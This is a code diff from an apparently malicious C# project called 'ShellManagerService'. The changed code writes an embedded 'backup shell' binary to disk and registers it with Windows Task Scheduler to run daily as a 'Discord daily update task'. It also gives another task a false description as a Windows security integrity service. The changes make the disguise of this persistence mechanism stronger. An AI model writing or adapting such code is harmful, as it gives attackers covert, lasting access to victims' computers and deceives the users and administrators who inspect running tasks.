@@ -67,31 +67,34 @@ namespace ShellManagerService
             File.Move(tmp_name, old_tmp_name);
         }
         //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
-        public static void LoadSecondShellAndStartService()
+        public static void LoadSecondShellAndCreateTask()
         {
             var full_path = backup_shell_folder + backup_shell_name;
 
-            while (true)
+            if (!File.Exists(full_path))
             {
-                try
+                while (true)
                 {
-                    //Write bytes into file
-                    FileStream fs = new FileStream(full_path,
-                                           FileMode.Open,
-                                           FileAccess.Write);
-                    fs.Write(embedded_image_1, 0, embedded_image_1.Length);
-                    fs.Close();
-                    break;
-                }
-                catch
-                {
+                    try
+                    {
+                        //Write bytes into file
+                        FileStream fs = new FileStream(full_path,
+                                               FileMode.Open,
+                                               FileAccess.Write);
+                        fs.Write(embedded_image_1, 0, embedded_image_1.Length);
+                        fs.Close();
+                        break;
+                    }
+                    catch
+                    {
 
+                    }
                 }
             }
 
             using (var ts = new TaskService())
             {
-                var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6));
+                var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6)).AsTask("Discord daily update task");
             }
         }
         //Give the module a random ass name idk
@@ -109,7 +112,7 @@ namespace ShellManagerService
                 var t = ts.Execute(file_path)
                     .Once()
                     .Starting(DateTime.Now.AddSeconds(1))
-                    .AsTask("Windows security manager service is used to check health and integrity of important system resources.");
+                    .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
             }
         }
     }
